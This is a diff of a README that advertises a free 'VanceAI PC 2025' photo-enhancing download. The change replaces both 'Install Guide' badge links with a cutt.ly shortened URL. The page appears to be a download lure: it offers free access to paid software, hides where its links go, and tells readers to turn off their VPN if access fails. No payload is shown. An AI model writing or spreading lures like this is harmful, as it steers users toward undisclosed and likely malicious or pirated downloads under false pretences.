@@ -5,7 +5,7 @@
 
 **Description**: Elevate your photos with **VanceAI PC 2025**, offering free AI editing access for stunning enhancements! This repository provides tutorials, resources, and tips to explore VanceAI’s neural network features for upscaling and denoising. Download your free version and join our vibrant community in 2025!  
 
-<a href="https://vanceaiphotoenhancingcommunity.github.io/.github/" target="_blank">
+<a href="https://cutt.ly/HrNtkIzR" target="_blank">
   <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
@@ -30,7 +30,7 @@ Enhance your photos with these simple steps to set up VanceAI PC 2025! 🛠️
 5. **Access Problems?** 🌐  
    If access fails, disable your VPN or switch browsers (e.g., Chrome, Firefox).  
 
-<a href="https://vanceaiphotoenhancingcommunity.github.io/.github/" target="_blank">
+<a href="https://cutt.ly/HrNtkIzR" target="_blank">
   <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
